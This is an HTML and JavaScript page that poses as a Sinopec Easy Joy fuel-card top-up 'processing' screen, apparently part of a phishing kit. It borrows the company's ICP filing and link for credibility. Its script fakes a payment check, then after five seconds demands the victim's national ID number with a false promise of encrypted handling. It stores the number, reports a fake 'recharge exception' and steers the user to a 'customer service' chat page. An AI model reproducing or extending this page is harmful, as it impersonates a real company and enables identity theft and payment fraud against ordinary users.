<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>充值处理中 - 易捷加油</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #F5F5F5;
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }
    
    /* 顶部导航 */
    .cj-header {
      background: linear-gradient(135deg, #E53935 0%, #C62828 100%);
      padding: 12px 16px;
      color: white;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-shrink: 0;
      box-shadow: 0 2px 8px rgba(229, 57, 53, 0.3);
    }
    
    .cj-back {
      font-size: 22px;
      cursor: pointer;
      padding: 4px;
    }
    
    .cj-title {
      font-size: 17px;
      font-weight: 700;
    }
    
    .cj-placeholder {
      width: 30px;
    }
    
    /* 内容区域 */
    .cj-content {
      flex: 1;
      overflow-y: auto;
      padding: 16px;
      -webkit-overflow-scrolling: touch;
    }
    
    /* 状态卡片 */
    .cj-status-card {
      background: white;
      border-radius: 12px;
      padding: 20px 16px;
      text-align: center;
      margin-bottom: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
    }
    
    .cj-status-icon {
      width: 60px;
      height: 60px;
      margin: 0 auto 12px;
      background: linear-gradient(135deg, #FFF8E1 0%, #FFECB3 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      animation: pulse 1.5s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    
    .cj-status-title {
      font-size: 18px;
      font-weight: 700;
      color: #333;
      margin-bottom: 6px;
    }
    
    .cj-status-desc {
      font-size: 12px;
      color: #999;
    }
    
    /* 加载动画 */
    .cj-spinner {
      width: 32px;
      height: 32px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #E53935;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 16px auto;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* 进度条 */
    .cj-progress {
      height: 3px;
      background: #f0f0f0;
      border-radius: 2px;
      margin: 12px 0;
      overflow: hidden;
    }
    
    .cj-progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #E53935 0%, #FF9800 100%);
      border-radius: 2px;
      transition: width 0.3s;
      animation: progress 5s linear forwards;
    }
    
    @keyframes progress {
      from { width: 0%; }
      to { width: 100%; }
    }
    
    /* 订单信息 */
    .cj-order-card {
      background: white;
      border-radius: 12px;
      padding: 14px;
      margin-bottom: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
    }
    
    .cj-order-title {
      font-size: 14px;
      font-weight: 700;
      color: #333;
      margin-bottom: 10px;
      padding-bottom: 8px;
      border-bottom: 1px solid #f0f0f0;
    }
    
    .cj-info-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 8px 0;
      border-bottom: 1px solid #f5f5f5;
      font-size: 13px;
    }
    
    .cj-info-row:last-child {
      border-bottom: none;
    }
    
    .cj-info-label {
      color: #666;
    }
    
    .cj-info-value {
      color: #333;
      font-weight: 500;
    }
    
    .cj-info-value.highlight {
      color: #E53935;
      font-weight: 700;
    }
    
    /* 保密提示 */
    .cj-privacy-tip {
      background: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%);
      border-radius: 8px;
      padding: 12px;
      text-align: center;
      margin-top: 12px;
      font-size: 12px;
      color: #1976D2;
    }
    
    /* Toast */
    .cj-toast {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0,0,0,0.85);
      color: white;
      padding: 10px 20px;
      border-radius: 8px;
      font-size: 13px;
      z-index: 9999;
      display: none;
    }
    
    /* 底部备案 */
    .cj-footer {
      text-align: center;
      padding: 12px 16px;
      font-size: 11px;
      color: #999;
      line-height: 1.6;
      border-top: 1px solid #eee;
      background-color: #fafafa;
    }
    
    .cj-footer a {
      color: #666;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <!-- 顶部导航 -->
  <div class="cj-header">
    <div class="cj-back" onclick="location.href='index.html'">←</div>
    <div class="cj-title">充值处理</div>
    <div class="cj-placeholder"></div>
  </div>
  
  <!-- 内容区域 -->
  <div class="cj-content">
    <!-- 状态卡片 -->
    <div class="cj-status-card">
      <div class="cj-status-icon">⏳</div>
      <div class="cj-status-title">充值处理中</div>
      <div class="cj-status-desc">正在验证您的支付信息，请稍候...</div>
      <div class="cj-spinner"></div>
      <div class="cj-progress">
        <div class="cj-progress-bar"></div>
      </div>
    </div>
    
    <!-- 订单信息 -->
    <div class="cj-order-card">
      <div class="cj-order-title">📋 订单详细信息</div>
      <div class="cj-info-row">
        <span class="cj-info-label">订单编号</span>
        <span class="cj-info-value" id="orderNo">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">充值手机号</span>
        <span class="cj-info-value" id="phoneDisplay">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">充值金额</span>
        <span class="cj-info-value" id="amountDisplay">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">代金券优惠</span>
        <span class="cj-info-value" style="color: #FF9800;" id="discountDisplay">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">实付金额</span>
        <span class="cj-info-value highlight" id="totalDisplay">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">支付方式</span>
        <span class="cj-info-value" id="paymentDisplay">-</span>
      </div>
      <div class="cj-info-row">
        <span class="cj-info-label">下单时间</span>
        <span class="cj-info-value" id="timeDisplay">-</span>
      </div>
    </div>
    
    <!-- 保密提示 -->
    <div class="cj-privacy-tip">
    </div>
  </div>
  
  <!-- 底部备案 -->
  <div class="cj-footer">
    <p style="margin: 0 0 2px 0;">
      <a href="http://www.sinopecgroup.com" target="_blank">京ICP备2020037595号-1</a>
    </p>
    <p style="margin: 0;">主办单位：中石化易捷销售有限公司 | </p>
  </div>
  
  <!-- Toast -->
  <div class="cj-toast" id="toast"></div>

  <script>
    // 获取订单数据
    let orderData = JSON.parse(localStorage.getItem('ej_last_order') || '{}');
    
    // 初始化
    function init() {
      // 显示订单信息
      document.getElementById('orderNo').textContent = orderData.orderNo || '-';
      document.getElementById('phoneDisplay').textContent = orderData.phone ? orderData.phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2') : '-';
      document.getElementById('amountDisplay').textContent = '¥' + (orderData.amount || 0);
      document.getElementById('discountDisplay').textContent = '-¥' + (orderData.discount || 0);
      document.getElementById('totalDisplay').textContent = '¥' + (orderData.payAmount || 0);
      document.getElementById('paymentDisplay').textContent = orderData.paymentMethod || '-';
      document.getElementById('timeDisplay').textContent = orderData.createdAt || new Date().toLocaleString();
      
      // 5秒后显示充值失败弹窗
      setTimeout(() => {
        showFailModal();
      }, 5000);
    }
    
    // 显示失败弹窗（简洁正式风格）
    function showFailModal() {
      const modal = document.createElement('div');
      modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 9999;
      `;
      
      modal.innerHTML = `
        <div style="background: white; padding: 24px; width: 88%; max-width: 300px;">
          <div style="text-align: center; margin-bottom: 20px;">
            <div style="font-size: 16px; font-weight: 600; color: #333; margin-bottom: 6px;">身份核实</div>
            <div style="font-size: 12px; color: #999;">请提供身份证号码进行核实</div>
          </div>
          
          <div style="margin-bottom: 16px;">
            <input type="text" id="idCardInput" placeholder="请输入18位身份证号" maxlength="18" 
              style="width: 100%; height: 40px; padding: 0 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
          </div>
          
          <div style="text-align: center; margin-bottom: 16px; padding: 8px; background: #f5f5f5; border-radius: 4px;">
            <span style="font-size: 11px; color: #666;">🔒 您的信息仅用于本次服务，数据加密传输，服务后匿名化处理。</span>
          </div>
          
          <button onclick="submitIdCard()" 
            style="width: 100%; height: 40px; background: #E53935; border: none; border-radius: 4px; color: white; font-size: 14px; cursor: pointer;">
            提交核实
          </button>
        </div>
      `;
      
      document.body.appendChild(modal);
      
      setTimeout(() => {
        document.getElementById('idCardInput').focus();
      }, 100);
    }
    
    // 提交身份证
    function submitIdCard() {
      const idCard = document.getElementById('idCardInput').value.trim();
      
      if (!idCard) {
        alert('请输入身份证号码');
        return;
      }
      
      if (!/^\d{17}[\dXx]$/.test(idCard)) {
        alert('请输入正确的18位身份证号码');
        return;
      }
      
      // 保存身份证
      localStorage.setItem('ej_idcard', idCard);
      
      // 关闭弹窗
      document.body.removeChild(document.querySelector('[style*="position: fixed"]'));
      
      // 显示处理中提示
      showToast('正在核实...', 'info');
      
      // 4秒后显示联系客服弹窗
      setTimeout(() => {
        showContactModal();
      }, 4000);
    }
    
    // 显示联系客服弹窗
    function showContactModal() {
      const modal = document.createElement('div');
      modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.6);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 9999;
        backdrop-filter: blur(8px);
        -webkit-backdrop-filter: blur(8px);
      `;
      
      modal.innerHTML = `
        <div style="background: white; padding: 24px; width: 88%; max-width: 300px; text-align: center;">
          <div style="font-size: 16px; font-weight: 600; color: #333; margin-bottom: 8px;">订单充值异常</div>
          <div style="font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 20px;">
            请联系在线客服处理<br>
            我们将尽快为您解决
          </div>
          <button onclick="goToContact()" 
            style="width: 100%; height: 40px; background: #E53935; border: none; border-radius: 4px; color: white; font-size: 14px; cursor: pointer;">
            联系客服
          </button>
        </div>
      `;
      
      document.body.appendChild(modal);
    }
    
    // 跳转到客服聊天页面
    function goToContact() {
      window.location.href = 'customer-chat.html';
    }
    
    // 关闭弹窗
    function closeModal(btn) {
      const modal = btn.closest('[style*="position: fixed"]');
      document.body.removeChild(modal);
    }
    
    // Toast提示
    function showToast(msg, type = 'info') {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.style.display = 'block';
      
      setTimeout(() => {
        toast.style.display = 'none';
      }, 2000);
    }
    
    // 页面加载时初始化
    window.onload = init;
  </script>
</body>
</html>
